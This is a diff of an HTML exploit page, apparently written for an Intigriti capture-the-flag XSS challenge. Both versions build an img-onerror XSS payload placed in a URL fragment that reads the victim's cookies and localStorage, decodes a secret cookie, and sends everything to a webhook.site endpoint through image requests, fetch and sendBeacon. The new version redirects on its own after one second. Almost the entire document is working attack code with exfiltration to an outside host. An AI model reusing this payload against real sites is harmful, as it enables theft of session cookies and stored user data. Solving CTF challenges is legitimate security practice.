@@ -5,7 +5,6 @@
     <style>
         body {
             margin: 0;
-            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -24,186 +23,127 @@
             border: none;
             border-radius: 8px;
             cursor: pointer;
-            z-index: 1000;
         }
     </style>
 </head>
 <body>
-    <button id="clickme" class="button">Click Me!</button>
-
+    <!-- This auto-redirects to the challenge site -->
     <script>
-        // When page loads
+        // Automatically redirect to challenge site with XSS payload in fragment
         window.onload = function() {
-            // Create perfect center button for bot to click
-            const centerButton = document.createElement('button');
-            centerButton.textContent = 'Click Me!';
-            centerButton.className = 'button';
-            
-            // When clicked, redirect to challenge site with malicious URL fragment
-            centerButton.addEventListener('click', function() {
-                // Create an iframe that points to the challenge site
-                const iframe = document.createElement('iframe');
-                
-                // Set up the iframe
-                iframe.style.position = 'fixed';
-                iframe.style.top = '0';
-                iframe.style.left = '0';
-                iframe.style.width = '100%';
-                iframe.style.height = '100%';
-                iframe.style.border = 'none';
-                iframe.style.zIndex = '9999';
-                
-                // Add exploit code in URL fragment that will execute when loaded
-                // This will extract data from the challenge site
-                iframe.src = "https://challenge-0325.intigriti.io/#" + encodeURIComponent(`
-                <img src=x onerror="
-                    (function() {
-                        // Get all cookies
-                        const cookies = document.cookie;
+            // Create the button first (in case redirect is blocked)
+            const button = document.createElement('button');
+            button.className = 'button';
+            button.textContent = 'Click Me!';
+            button.onclick = function() {
+                // XSS payload that will execute on challenge site to extract and leak data
+                const xssPayload = `<img src=x onerror="
+                    (function(){
+                        // Gather data to exfiltrate
+                        const c = document.cookie;
+                        const notes = localStorage.getItem('notes') || '';
+                        const auth = localStorage.getItem('isAuthenticated') || '';
                         
-                        // Get localStorage data
-                        const localStorageData = {};
-                        for (let i = 0; i < localStorage.length; i++) {
-                            const key = localStorage.key(i);
-                            localStorageData[key] = localStorage.getItem(key);
+                        // Secret cookie handling (contains flag)
+                        let s = '';
+                        if(c.includes('secret=')){
+                            s = c.split('secret=')[1].split(';')[0];
                         }
                         
-                        // Try to get the secret cookie and decode it
-                        let secretCookie = '';
-                        let decodedSecret = '';
-                        try {
-                            const cookieParts = cookies.split('; ');
-                            for (let i = 0; i < cookieParts.length; i++) {
-                                if (cookieParts[i].startsWith('secret=')) {
-                                    secretCookie = cookieParts[i].substring(7);
-                                    break;
-                                }
-                            }
-                            
-                            if (secretCookie) {
-                                decodedSecret = atob(secretCookie);
-                            }
-                        } catch (e) {}
+                        // Try to decode secret (username:flag format)
+                        let d = '';
+                        try { d = atob(s); } catch(e){}
                         
-                        // Prepare data to send
-                        const data = {
-                            cookies: cookies,
-                            localStorage: localStorageData,
-                            secretCookie: secretCookie,
-                            decodedSecret: decodedSecret,
-                            url: window.location.href,
-                            timestamp: new Date().toISOString()
-                        };
-                        
-                        // Try to extract flag from decoded secret
-                        if (decodedSecret && decodedSecret.includes(':')) {
-                            data.flag = decodedSecret.split(':')[1];
+                        // Extract flag from decoded secret
+                        let f = '';
+                        if(d && d.includes(':')) {
+                            f = d.split(':')[1];
                         }
                         
-                        // Send data via fetch
-                        try {
-                            fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify(data),
-                                mode: 'no-cors'
-                            });
-                        } catch (e) {}
+                        // Send data using image (most reliable)
+                        const img = new Image();
+                        img.src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?f='+
+                            encodeURIComponent(f)+
+                            '&s='+encodeURIComponent(s)+
+                            '&d='+encodeURIComponent(d)+
+                            '&auth='+encodeURIComponent(auth)+
+                            '&n='+encodeURIComponent(notes.substring(0,100))+
+                            '&t='+Date.now();
+                        document.body.appendChild(img);
                         
-                        // Send via image as backup
-                        try {
-                            const img = new Image();
-                            img.src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag=' + 
-                                encodeURIComponent(data.flag || '') + 
-                                '&secret=' + encodeURIComponent(secretCookie) +
-                                '&notes=' + encodeURIComponent(JSON.stringify(localStorageData)) +
-                                '&t=' + Date.now();
-                            document.body.appendChild(img);
-                        } catch (e) {}
-                        
-                        // Try beacon
-                        try {
-                            navigator.sendBeacon(
-                                'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a',
-                                JSON.stringify(data)
-                            );
-                        } catch (e) {}
+                        // Also send via fetch
+                        fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a', {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            body: JSON.stringify({
+                                flag: f,
+                                cookies: c,
+                                secret: s,
+                                decoded: d,
+                                auth: auth,
+                                notes: notes,
+                                url: location.href
+                            })
+                        });
                     })();
-                ">
-                `);
+                ">`;
                 
-                // Add iframe to page
-                document.body.innerHTML = '';
-                document.body.appendChild(iframe);
-                
-                // Schedule a second attempt using a different approach
-                setTimeout(function() {
-                    // Create a link that navigates to the challenge site with script in fragment
-                    const link = document.createElement('a');
-                    link.href = "https://challenge-0325.intigriti.io/notes#" + encodeURIComponent(`
-                    <img src=x onerror="
-                        setTimeout(function() {
-                            const img = new Image();
-                            img.src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?c=' + 
-                                encodeURIComponent(document.cookie) + 
-                                '&ls=' + encodeURIComponent(localStorage.getItem('notes')) +
-                                '&auth=' + encodeURIComponent(localStorage.getItem('isAuthenticated')) +
-                                '&t2=' + Date.now();
-                            document.body.appendChild(img);
-                        }, 1000);
-                    ">
-                    `);
-                    
-                    // Click the link programmatically
-                    link.style.display = 'none';
-                    document.body.appendChild(link);
-                    link.click();
-                }, 10000);
-            });
+                // Redirect to challenge site with XSS payload
+                window.location.href = 'https://challenge-0325.intigriti.io/notes#' + encodeURIComponent(xssPayload);
+            };
             
-            // Replace the original button with our center button
-            document.body.innerHTML = '';
-            document.body.appendChild(centerButton);
+            // Add button to page
+            document.body.appendChild(button);
             
-            // Try an initial redirect approach
+            // Automatically redirect to challenge site after 1 second
             setTimeout(function() {
-                // Add a hidden image with an attempt to redirect 
-                const img = document.createElement('img');
-                img.style.display = 'none';
-                img.onerror = function() {
-                    // Try to navigate to challenge site with XSS payload
-                    const challUrl = "https://challenge-0325.intigriti.io/protected-note#" + encodeURIComponent(`
-                    <img src=x onerror="
-                        setTimeout(function() {
-                            const data = {
-                                cookies: document.cookie,
-                                localStorage: {
-                                    notes: localStorage.getItem('notes'),
-                                    isAuthenticated: localStorage.getItem('isAuthenticated')
-                                }
-                            };
-                            
-                            // Send via beacon for reliability
-                            navigator.sendBeacon(
-                                'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a',
-                                JSON.stringify(data)
-                            );
-                        }, 500);
-                    ">
-                    `);
-                    
-                    // Hidden iframe to the challenge site
-                    const hiddenFrame = document.createElement('iframe');
-                    hiddenFrame.style.position = 'absolute';
-                    hiddenFrame.style.top = '-9999px';
-                    hiddenFrame.style.left = '-9999px';
-                    hiddenFrame.style.width = '1px';
-                    hiddenFrame.style.height = '1px';
-                    hiddenFrame.src = challUrl;
-                    document.body.appendChild(hiddenFrame);
-                };
-                img.src = "x"; // Will trigger error
-                document.body.appendChild(img);
+                // Same payload as button click, just executed automatically
+                const xssPayload = `<img src=x onerror="
+                    (function(){
+                        // Gather data to exfiltrate
+                        const c = document.cookie;
+                        const notes = localStorage.getItem('notes') || '';
+                        const auth = localStorage.getItem('isAuthenticated') || '';
+                        
+                        // Secret cookie handling
+                        let s = '';
+                        if(c.includes('secret=')){
+                            s = c.split('secret=')[1].split(';')[0];
+                        }
+                        
+                        // Try to decode secret
+                        let d = '';
+                        try { d = atob(s); } catch(e){}
+                        
+                        // Extract flag from decoded secret
+                        let f = '';
+                        if(d && d.includes(':')) {
+                            f = d.split(':')[1];
+                        }
+                        
+                        // Send data using image (most reliable)
+                        const img = new Image();
+                        img.src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?f='+
+                            encodeURIComponent(f)+
+                            '&s='+encodeURIComponent(s)+
+                            '&d='+encodeURIComponent(d)+
+                            '&auth='+encodeURIComponent(auth)+
+                            '&n='+encodeURIComponent(notes.substring(0,100))+
+                            '&t='+Date.now();
+                        document.body.appendChild(img);
+                        
+                        // Schedule another attempt to exfiltrate
+                        setTimeout(function(){
+                            const img2 = new Image();
+                            img2.src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?auto=1&f='+
+                                encodeURIComponent(f)+'&t='+Date.now();
+                            document.body.appendChild(img2);
+                        }, 5000);
+                    })();
+                ">`;
+                
+                // Redirect
+                window.location.href = 'https://challenge-0325.intigriti.io/protected-note#' + encodeURIComponent(xssPayload);
             }, 1000);
         };
     </script>
